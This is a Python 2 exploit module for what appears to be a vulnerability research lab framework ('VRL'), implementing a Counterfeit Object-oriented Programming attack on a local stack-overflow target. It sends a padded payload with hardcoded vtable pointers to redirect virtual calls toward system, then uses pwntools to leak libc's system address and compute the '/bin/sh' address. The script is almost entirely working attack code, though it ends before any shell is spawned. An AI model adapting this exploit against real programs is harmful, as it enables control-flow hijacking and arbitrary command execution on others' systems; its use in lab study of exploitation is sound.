#! /usr/bin/python
#coding:utf-8
import os
import socket
import sys
sys.path.append(os.path.abspath("../.."))
from modules import exploit
from pwnlib.elf import ELF
from pwnlib.util.packing import *


class Exploit(exploit.VRL_Exploit):
    def __init__(self):
        '''Add information of your exploit here'''
        self.name = 'coop'
        self.payload_info = 'DEP ON ALSR OFF'
        self.info = '''Exploit Name : coop
Exploit abstract :Counterfeit Object-oriented Programming,induces malicious program behavior by only invoking
chains of existing C++ virtual functions in a program through
corresponding existing call sites.
Author : guoyingjie
Support change payload : false'''
        self.property = {
                         'courseMLoopVptr':0x4010d8,#Course  vptr to mLoop
                         'studentsptr':0x7fffffffdc58,
                         'nstudent':0x1,
                         'studentptr0':0x7fffffffdc60,
                         'coursePrintfSystemVptr':0x4010f0,#Course  vptr to printfSystem
                         'offset':24, # offset
                         'sysaddress':0x0} # system function address, initialize 0
        self.options={'dIP' : '127.0.0.1',
                      'port':'34567',
                      'allow_stack_exec' : 'False',
                      'static' : 'False',
                      'architecture' : 'amd64',
                      'aslr' : 'off'
                      }
        self.vulnerability= 'vulnerabilities/stack_overflow/coop'

    def run(self):
     if self.options['architecture'] == 'amd64':
      if self.options['static'] == 'False':
        '''Run your exploit here, if this script could success, the VRL can run it.
        When the exploit run, follow the options.'''
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((self.options['dIP'], int(self.options['port'])))
        a = raw_input('input: ')


        
        #set payload
        temppayload = "b"*512
        s.send(temppayload)
        payload = "a"*self.property['offset'] + p64(self.property['courseMLoopVptr']) + p64(self.property['studentsptr']) + p64(self.property['nstudent']) + p64(self.property['studentptr0']) + p64(self.property['coursePrintfSystemVptr']) 
        s.send(payload)
        #get new sysaddress here
        recv_data = s.recv(16)
        self.property['sysaddress'] = int(recv_data,16)
        print "sysaddress = " + hex(self.property['sysaddress'])

        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

        #get /bin/sh offset
        binsh_addr_offset = next(libc.search('/bin/sh')) -libc.symbols['system']
        print "binsh_addr_offset = " + hex(binsh_addr_offset)

       
        #get /bin/sh address
        binsh_addr = self.property['sysaddress'] + binsh_addr_offset
        print "binsh_addr = " + hex(binsh_addr)

        s.close()

      else:
        print 'static'
     elif self.options['architecture'] == 'i386':

      if self.options['static'] == 'False':
        print 'dl'
       
      else:
        print 'static'
       
     else:
        print 'Unrecognized architecture, stop.'
        return
       

'''Bellowing is default, simply ignore it.'''
if __name__ == "__main__":
    if '__init__.py' not in os.listdir(os.curdir):
        os.mknod('__init__.py')
    exp = Exploit()
    print 'Exploit: ',exp.name,' \n'
    print 'Checking:\n'
    if exp.check():
        print 'Running:\n'
        exp.run()
